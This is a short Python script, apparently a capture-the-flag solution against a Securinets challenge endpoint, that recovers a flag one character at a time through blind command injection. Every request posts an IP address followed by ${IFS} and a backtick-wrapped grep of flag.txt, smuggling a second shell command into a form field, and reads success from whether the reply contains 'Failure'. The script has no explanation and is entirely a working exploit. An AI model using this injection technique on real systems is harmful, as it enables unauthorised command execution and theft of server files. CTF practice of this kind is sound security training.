import requests

target="https://vault.web1.friendly-ctf.securinets.tn/vault"

chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
flag="Securinets{"
i=True
while i:
    for c in chars:
        temp_flag=flag+c
        payload=f'8.8.8.8${{IFS}}`grep${{IFS}}^{temp_flag}${{IFS}}flag.txt`'
        response = requests.post(target, data={'input': payload})
        if "Failure" in response.text:
            flag = temp_flag
            print(f"Current flag: {flag}")
        if flag and flag[-1] == "}":
            print(f"Flag found: {flag}")
            i=False
            break
            